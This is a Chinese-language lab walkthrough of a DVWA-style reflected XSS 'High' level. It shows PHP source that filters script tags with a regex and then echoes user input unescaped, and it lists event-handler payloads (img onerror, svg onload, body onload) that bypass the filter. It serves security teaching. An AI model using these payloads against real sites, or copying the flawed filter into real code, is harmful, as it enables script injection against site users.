## 源码 (`high.php`)

```php
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
//                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 正则删除任何含 script 的标签

$html .= "<pre>Hello {$name}</pre>";
```

## 比 Medium 多了什么

- `str_replace` 换成 `preg_replace`，正则匹配 `<(任意字符)s(任意字符)c(任意字符)r(任意字符)i(任意字符)p(任意字符)t`
- `/i` 不区分大小写
- 中间夹字符也能匹配（如 `<scr<script>ipt>` → 全被删掉）

## 漏洞在哪

正则只关注六个字母 `s-c-r-i-p-t` 按顺序出现。**不用这六个字母的标签完全不受影响。**

## 攻击步骤

| payload                        | 原理                        |
| ------------------------------ | ------------------------- |
| `<img src=x onerror=alert(1)>` | 标签和事件里没有 s-c-r-i-p-t 连在一起 |
| `<svg onload=alert(1)>`        | 同上                        |
| `<body onload=alert(1)>`       | 同上                        |

## 为什么能绕过

| 防护 | 为什么没用 |
|------|-----------|
| 正则 `/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i` | 只看住 `<script>` 标签，HTML 能执行 JS 的标签有几十个 |
| 不区分大小写 | 没用——绕过的 payload 根本不写 `script` 这个词 |
| 中间夹字符也杀 | 杀 `<s-------c------r---i--p---t>` 这类变体——但不杀 `<img>` |

## 关键教训

**`<script>` 不是执行 JS 的唯一方式。** `<img onerror>`、`<svg onload>`、`<body onload>`、`<input onfocus>` 等几十种标签+事件组合都能弹窗。正则匹配的一个特定模式在 HTML 里等于没防。
